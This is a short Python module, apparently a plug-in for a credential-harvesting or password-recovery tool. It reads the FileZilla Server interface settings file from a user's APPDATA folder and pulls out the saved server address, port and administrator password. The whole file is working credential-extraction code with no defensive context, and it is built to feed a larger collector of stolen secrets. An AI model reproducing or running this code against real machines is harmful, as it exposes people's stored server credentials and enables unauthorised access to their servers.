# -*- coding: utf-8 -*-
from xml.etree.cElementTree import ElementTree

import os


class FilezillaServer:
    def run(self, profile):
        path = os.path.join(profile['APPDATA'], 'FileZilla Server')
        if not os.path.exists(path):
            return

        xml_file = os.path.join(path, 'FileZilla Server Interface.xml')

        if os.path.exists(xml_file):
            tree = ElementTree(file=xml_file)
            root = tree.getroot()
            host = port = password = None

            for item in root.iter("Item"):
                if item.attrib['name'] == 'Last Server Address':
                    host = item.text
                elif item.attrib['name'] == 'Last Server Port':
                    port = item.text
                elif item.attrib['name'] == 'Last Server Password':
                    password = item.text
            # if all((host, port, login)) does not work
            if host is not None and port is not None and password is not None:
                return [{
                    'Host': host,
                    'Port': port,
                    'Password': password,
                }]


modules = {"FilezillaServer": FilezillaServer()}
